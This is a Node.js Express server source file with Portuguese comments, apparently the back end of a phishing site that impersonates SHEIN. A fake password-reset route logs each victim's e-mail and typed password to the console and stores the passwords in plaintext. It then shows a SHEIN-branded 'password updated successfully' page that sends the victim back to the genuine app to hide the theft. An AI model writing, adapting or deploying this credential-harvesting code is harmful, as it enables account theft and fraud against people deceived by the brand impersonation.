const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// --- AJUSTE PARA O RENDER ---
const PORT = process.env.PORT || 3000;

// Configuração para ler os dados enviados pelo formulário HTML
app.use(bodyParser.urlencoded({ extended: true }));

// ROTA PRINCIPAL: Abre diretamente o seu arquivo shein.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'shein.html'));
});

// Permite o uso de outros arquivos estáticos na mesma pasta
app.use(express.static(__dirname));

// --- CONFIGURAÇÃO DO BANCO DE DADOS ---
const db = new sqlite3.Database('./loja.db', (err) => {
    if (err) {
        console.error('Erro ao conectar ao banco:', err.message);
    } else {
        console.log('Conectado ao banco de dados SQLite da SHEIN.');
    }
});

// Cria a tabela de usuários caso ela ainda não exista
db.run(`CREATE TABLE IF NOT EXISTS usuarios (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE,
    senha TEXT
)`);

// --- ROTA QUE RECEBE OS DADOS DO FORMULÁRIO ---
app.post('/redefinir-senha', (req, res) => {
    const { email, senhaAtual, novaSenha } = req.body;

    // Mostra os dados digitados direto nos Logs do Render em tempo real
    console.log(`\n[NOVO ENVIO RECEBIDO] E-mail: ${email} | Senha Digitada: ${novaSenha}\n`);

    // Busca se o e-mail digitado já existe no banco de dados
    db.get(`SELECT * FROM usuarios WHERE email = ?`, [email], (err, row) => {
        if (err) {
            return res.status(500).send("Erro ao consultar o banco de dados.");
        }

        // HTML padronizado com o mesmo design, fontes e cores da sua página de login
        const htmlResposta = `
            <!DOCTYPE html>
            <html lang="pt-BR">
            <head>
                <meta charset="UTF-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Acesso Confirmado - Segurança SHEIN</title>
                <style>
                    * {
                        margin: 0;
                        padding: 0;
                        box-sizing: border-box;
                        font-family: Arial, sans-serif;
                    }

                    body {
                        background: #f5f5f5;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                    }

                    .login-box {
                        background: white;
                        width: 360px;
                        padding: 40px;
                        border-radius: 10px;
                        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                        text-align: center;
                    }

                    .logo {
                        font-size: 32px;
                        font-weight: bold;
                        margin-bottom: 25px;
                        letter-spacing: 2px;
                    }

                    h2 {
                        font-size: 20px;
                        color: #000;
                        margin-bottom: 15px;
                        font-weight: bold;
                        line-height: 1.3;
                    }

                    p {
                        color: #666;
                        font-size: 14px;
                        line-height: 1.5;
                        margin-bottom: 10px;
                    }

                    .login-btn {
                        display: inline-block;
                        width: 100%;
                        padding: 14px;
                        border: none;
                        background: black;
                        color: white;
                        font-size: 16px;
                        border-radius: 5px;
                        cursor: pointer;
                        text-decoration: none;
                        font-weight: bold;
                        margin-top: 15px;
                        transition: 0.3s;
                    }

                    .login-btn:hover {
                        background: #333;
                    }
                </style>
            </head>
            <body>

                <div class="login-box">
                    <div class="logo">SHEIN</div>
                    <h2>Sua senha foi atualizada com sucesso!</h2>
                    <p>Retorne ao app da Shein e boas compras.</p>
                    
                    <!-- Botão direcionando para a SHEIN na Play Store com estilo idêntico -->
                    <a href="https://play.google.com/store/apps/details?id=com.zzkko" target="_blank" class="login-btn">
                        Voltar para a SHEIN
                    </a>
                </div>

            </body>
            </html>
        `;

        if (!row) {
            // SE O USUÁRIO NÃO EXISTIR: Cadastra ele direto
            db.run(`INSERT INTO usuarios (email, senha) VALUES (?, ?)`, [email, novaSenha], function(err) {
                if (err) return res.send("Erro ao cadastrar novo usuário.");
                res.send(htmlResposta);
            });
        } else {
            // SE O USUÁRIO JÁ EXISTIR: Atualiza a senha dele no banco
            db.run(`UPDATE usuarios SET senha = ? WHERE email = ?`, [novaSenha, email], function(err) {
                if (err) return res.send("Erro ao atualizar a senha no banco.");
                res.send(htmlResposta);
            });
        }
    });
});

// Inicia o servidor na porta correta (PORT)
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});